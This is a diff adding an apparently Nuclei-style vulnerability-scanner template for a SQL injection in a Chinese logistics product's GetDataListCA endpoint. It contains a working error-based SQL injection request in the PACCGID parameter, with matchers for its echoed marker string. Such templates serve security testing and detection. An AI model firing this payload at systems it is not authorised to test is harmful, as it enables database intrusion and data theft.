@@ -1,0 +1,26 @@
+id: dongshengwuliu-getdatalistca-sqli
+
+info:
+  name: 东方物流 GetDataListCA SQL注入漏洞
+  author: qwtd
+  severity: high
+  description: |
+    东方物流 GetDataListCA SQL注入漏洞，攻击者可利用该漏洞执行任意SQL命令。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%E8%BD%AF%E4%BB%B6/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%E8%BD%AF%E4%BB%B6GetDataListCA%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: 东胜物流软件
+
+http:
+  - raw:
+      - |
+        GET /MvcShipping/MsCwGenlegAccitems/GetDataListCA?PACCGID=1%27%29+AND+6782+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%286782%3D6782%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--+OevW HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "qqxvq1qbjjq"
+      - type: status
+        status:
+          - 500
